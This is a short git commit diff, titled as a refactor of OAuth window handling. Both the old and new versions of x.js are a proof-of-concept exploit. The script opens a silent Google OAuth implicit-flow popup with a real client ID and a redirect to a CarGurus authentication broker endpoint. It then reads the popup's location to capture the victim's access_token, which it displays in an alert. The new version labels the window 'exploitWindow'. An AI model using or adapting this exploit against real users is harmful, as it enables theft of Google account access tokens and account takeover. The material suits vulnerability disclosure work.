c0d1cccddfa8a4bc6adb0c8b47782465c773ec14
alfredo1111 <alfredgotu@gmail.com>
2025-12-18 22:21:07 +0100

    Refactor OAuth window handling and polling logic

--- x.js
+++ x.js
@@ -1,23 +1,11 @@
-let w = window.open(
-  "https://accounts.google.com/o/oauth2/v2/auth" +
-  "?client_id=396192454224-vm2jk77e46pfa69esi2q6h61vitaiudn.apps.googleusercontent.com" +
-  "&redirect_uri=" + encodeURIComponent(
-    "https://auth.cargurus.co.uk/auth/realms/cargurus/broker/google/endpoint"
-  ) +
-  "&response_type=token" +
-  "&scope=openid email" +
-  "&prompt=none",
-  "g",
-  "width=500,height=600"
+let exploitWindow = window.open(
+    "https://accounts.google.com/o/oauth2/v2/auth?client_id=396192454224-vm2jk77e46pfa69esi2q6h61vitaiudn.apps.googleusercontent.com&redirect_uri=https://auth.cargurus.co.uk/auth/realms/cargurus/broker/google/endpoint&state=a&response_type=token&scope=openid&prompt=none",
+    "a",
+    "width=600,height=400,status=yes,scrollbars=yes,resizable=yes"
 );
 
-(function poll(){
-  try {
-    if (w.location.hash && w.location.hash.includes("access_token")) {
-      alert(w.location.href);
-      w.close();
-      return;
-    }
-  } catch(e) {}
-  setTimeout(poll, 100);
-})();
+// Obtain access_token - access to exploitWindow.window.location is only possible from same origin of window
+setTimeout(function(){
+    alert(exploitWindow.window.location);
+    exploitWindow.close();
+},2000);
